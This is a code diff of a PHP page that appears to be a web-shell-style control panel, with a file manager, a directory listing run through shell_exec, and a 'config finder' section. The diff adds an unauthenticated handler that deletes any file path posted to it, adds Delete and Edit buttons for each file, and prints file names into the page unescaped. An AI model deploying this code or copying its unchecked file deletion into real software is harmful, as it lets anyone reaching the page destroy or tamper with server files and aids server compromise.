@@ -1,3 +1,12 @@
+<?php
+  if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
+      $fileToDelete = $_POST['delete_file'];
+      if (file_exists($fileToDelete)) {
+          unlink($fileToDelete);
+      }
+  }
+?>
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -236,45 +245,51 @@
       }
 
       function fileManagerFunction() {
-        navItems.forEach(function(item) {
-          item.style.color = "green";
-        });
-        fileManager.style.color = "lime";
+            navItems.forEach(function(item) {
+                item.style.color = "green";
+            });
+            fileManager.style.color = "lime";
 
-        content.innerHTML = `
-        <div class="file-margin">
-            <form method="POST">
-                <input type="text" name="path" class="file-search" placeholder="Enter a path.." required>
-                <button type="submit" class="file-button">Search</button>
-            </form>
-        </div>
-        <table class="file-table" border="1">
-            <tr>
-                <th>File Name</th>
-                <th>Actions</th>
-            </tr>
-            <?php
-            if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['path'])) {
-                $path = escapeshellarg($_POST['path']); 
+            content.innerHTML = `
+                <div class="file-margin">
+                    <form method="POST">
+                        <input type="text" name="path" class="file-search" placeholder="Enter a path.." required>
+                        <button type="submit" class="file-button">Search</button>
+                    </form>
+                </div>
+                <table class="file-table" border="1">
+                    <tr>
+                        <th>File Name</th>
+                        <th>Actions</th>
+                    </tr>
+                    <?php
+                    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['path'])) {
+                        $path = escapeshellarg($_POST['path']); 
 
-                $files = shell_exec("ls $path 2>&1");
-                $fileArray = explode("\n", trim($files));
+                        $files = shell_exec("ls $path 2>&1");
+                        $fileArray = explode("\n", trim($files));
 
-                foreach ($fileArray as $file) {
-                    if (!empty($file)) {
-                        echo "<tr>
-                                <td>{$file}</td>
-                                <td>
-                                    <button class='file-button'>Edit</button>
-                                    <button class='file-button'>Delete</button>
-                                </td>
-                              </tr>";
+                        foreach ($fileArray as $file) {
+                            if (!empty($file)) {
+                                echo "<tr>
+                                        <td>{$file}</td>
+                                        <td>
+                                            <form method='POST' style='display:inline;'>
+                                                <input type='hidden' name='delete_file' value='$file'>
+                                                <button class='file-button' type='submit'>Delete</button>
+                                            </form>
+                                            <form method='POST' style='display:inline;'>
+                                                <input type='hidden' name='edit_file' value='$file'>
+                                                <button class='file-button' type='submit'>Edit</button>
+                                            </form>
+                                        </td>
+                                      </tr>";
+                            }
+                        }
                     }
-                }
-            }
-            ?>
-        </table>
-    `;
+                    ?>
+                </table>
+            `;
       }
 
       function configFinderFunction() {
@@ -354,3 +369,4 @@
     </script>
   </body>
 </html>
+
